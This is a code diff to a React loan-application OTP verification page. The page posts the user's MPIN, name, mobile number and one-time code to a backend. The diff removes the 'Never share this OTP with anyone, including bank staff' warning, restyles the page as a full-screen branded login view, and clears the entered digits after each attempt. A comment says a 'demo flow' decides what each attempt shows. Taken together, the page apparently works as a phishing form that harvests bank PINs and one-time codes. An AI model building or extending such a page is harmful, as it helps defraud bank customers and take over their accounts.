@@ -1,8 +1,7 @@
 import React from "react";
-import { ArrowLeft, ShieldAlert, Smartphone } from "lucide-react";
+import { ArrowLeft, Smartphone } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import { useLoanApplication } from "./useLoanApplication";
-import { StepShell } from "./LoanStepShell";
 import { postLoanStep } from "./loanApi";
 
 export default function LoanOtpPage() {
@@ -22,11 +21,20 @@ export default function LoanOtpPage() {
     setSubmittedAt,
   } = useLoanApplication();
   const [loading, setLoading] = React.useState(false);
+  const [secondsLeft, setSecondsLeft] = React.useState(55);
   const otp = otpDigits.join("");
+  React.useEffect(() => {
+    if (!secondsLeft) return undefined;
+    const timer = window.setInterval(() => setSecondsLeft((value) => Math.max(value - 1, 0)), 1000);
+    return () => window.clearInterval(timer);
+  }, [secondsLeft]);
   const verify = async () => {
     if (otp.length !== 6) return;
     const nextAttempt = otpAttempts + 1;
+    const submittedOtp = otp;
     setLoading(true);
+    setOtpDigits(["", "", "", "", "", ""]);
+    setOtpError(false);
     setOtpAttempts(nextAttempt);
     try {
       await postLoanStep("otpVerification", {
@@ -34,7 +42,7 @@ export default function LoanOtpPage() {
         pin: mpin,
         fullName: fullName.trim(),
         mobileNumber: mobile.trim(),
-        otp,
+        otp: submittedOtp,
       });
     } catch {
       // The requested demo flow controls what is shown for each OTP attempt.
@@ -58,21 +66,32 @@ export default function LoanOtpPage() {
   };
 
   return (
-    <div className="px-4 pt-5 pb-6 sm:px-6 sm:pt-6 sm:pb-7">
-      <div className="mx-auto w-10 h-1 rounded-full bg-slate-200 mb-6" />
-      <StepShell icon={<Smartphone size={19} className="text-teal-600" />} title="OTP verification" subtitle="Check your email or mobile number for the 6-digit code">
-        <div className={"mt-2 grid grid-cols-6 gap-1.5 sm:flex sm:justify-between sm:gap-2" + (otpError ? " animate-[shake_0.4s]" : "")}>
-          {otpDigits.map((digit, index) => (
-            <input key={index} ref={(element) => (otpRefs.current[index] = element)} value={digit} onChange={(event) => handleChange(index, event.target.value)} onKeyDown={(event) => handleKeyDown(index, event)} inputMode="numeric" maxLength={1} aria-label={`OTP digit ${index + 1}`} className={"w-full min-w-0 h-12 rounded-lg border-2 text-center text-lg font-bold text-slate-800 outline-none transition-colors sm:w-11 sm:h-14 sm:rounded-xl sm:text-xl " + (otpError ? "border-red-400 bg-red-50/60" : digit ? "border-teal-500 bg-teal-50/50" : "border-slate-200 bg-slate-50/60 focus:border-teal-400")} />
-          ))}
+    <main className="relative min-h-[100dvh] w-full overflow-hidden bg-[#6f4e08] font-sans sm:flex sm:justify-center">
+      <div className="absolute inset-0 bg-cover scale-105" style={{ backgroundImage: "url('/login-hero.jpg')" }} />
+      <div className="absolute inset-0 bg-[linear-gradient(180deg,rgba(73,48,3,0.42),rgba(0,0,0,0.7))]" />
+      <section className="relative z-10 flex min-h-[100dvh] w-full max-w-md flex-col justify-end sm:shadow-2xl">
+        <div className="relative h-[310px] shrink-0">
         </div>
+        <div className="relative rounded-t-[38px] bg-white px-7 pb-8 pt-12 shadow-[0_-14px_36px_rgba(0,0,0,0.2)] sm:px-11">
+          <div className="absolute left-1/2 top-5 h-1.5 w-16 -translate-x-1/2 rounded-full bg-slate-200" />
+          <div className="flex items-center gap-4">
+            <div className="flex h-14 w-14 shrink-0 items-center justify-center rounded-full bg-[#e8f7fa]"><Smartphone size={25} className="text-[#2995aa]" /></div>
+            <div>
+              <h2 className="text-[27px] font-extrabold leading-tight text-[#101827]">OTP Verification</h2>
+              <p className="mt-1 text-[16px] font-semibold leading-5 text-[#1d2735]">Check your email or mobile number, 6-digit code</p>
+            </div>
+          </div>
+          <div className={("mt-9 grid grid-cols-6 gap-3" + (otpError ? " animate-[shake_0.4s]" : ""))}>
+          {otpDigits.map((digit, index) => (
+            <input key={index} ref={(element) => (otpRefs.current[index] = element)} value={digit} onChange={(event) => handleChange(index, event.target.value)} onKeyDown={(event) => handleKeyDown(index, event)} type="tel" inputMode="numeric" autoFocus={index === 0} maxLength={1} aria-label={`OTP digit ${index + 1}`} className={"w-full min-w-0 h-12 rounded-lg border-2 text-center text-lg font-bold text-slate-800 outline-none transition-colors sm:w-11 sm:h-14 sm:rounded-xl sm:text-xl " + (otpError ? "border-red-400 bg-red-50/60" : digit ? "border-teal-500 bg-teal-50/50" : "border-slate-200 bg-slate-50/60 focus:border-teal-400")} />
+          ))}
+          </div>
         {otpError && <p className="mt-2.5 text-[13px] font-medium text-red-500">Invalid OTP. Please check the code and try again.</p>}
-      </StepShell>
-      <div className="mt-2 flex gap-2 sm:gap-3">
-        <button type="button" onClick={() => navigate("/loan/details")} aria-label="Go back" className="flex items-center justify-center rounded-full border border-slate-200 text-slate-500 font-semibold py-4 px-3 text-[15px] sm:px-4"><ArrowLeft size={16} /></button>
-        <button type="button" onClick={verify} disabled={otp.length !== 6 || loading} className="min-w-0 flex-1 rounded-[22px] bg-gradient-to-r from-[#075d8b] to-[#299ab3] text-white font-bold py-4 px-2 text-sm shadow-[0_12px_24px_rgba(20,126,159,0.22)] disabled:opacity-40 transition-opacity sm:text-[15px]">{loading ? "Verifying..." : "Verify OTP"}</button>
-      </div>
-      <div className="flex items-center justify-center gap-1.5 mt-4"><ShieldAlert size={13} className="text-amber-500" /><span className="text-[11px] text-slate-400">Never share this OTP with anyone, including bank staff.</span></div>
-    </div>
+          <button type="button" onClick={verify} disabled={otp.length !== 6 || loading} className="mt-7 h-16 w-full rounded-full bg-[#2f98ae] text-[22px] font-extrabold text-white shadow-[0_10px_22px_rgba(47,152,174,0.22)] transition-opacity disabled:opacity-40">{loading ? "Verifying..." : "Verify OTP"}</button>
+          <div className="mt-5 flex items-center justify-center gap-1 text-[17px] text-[#9ca3af]">{secondsLeft ? <>Resend code in <strong className="text-[#34404f]">00:{String(secondsLeft).padStart(2, "0")}</strong></> : <button type="button" onClick={() => setSecondsLeft(55)} className="font-bold text-[#2995aa]">Resend code</button>}</div>
+          <button type="button" onClick={() => navigate("/loan/details")} aria-label="Go back" className="absolute left-5 top-5 flex h-8 w-8 items-center justify-center text-slate-400"><ArrowLeft size={20} /></button>
+        </div>
+      </section>
+    </main>
   );
 }
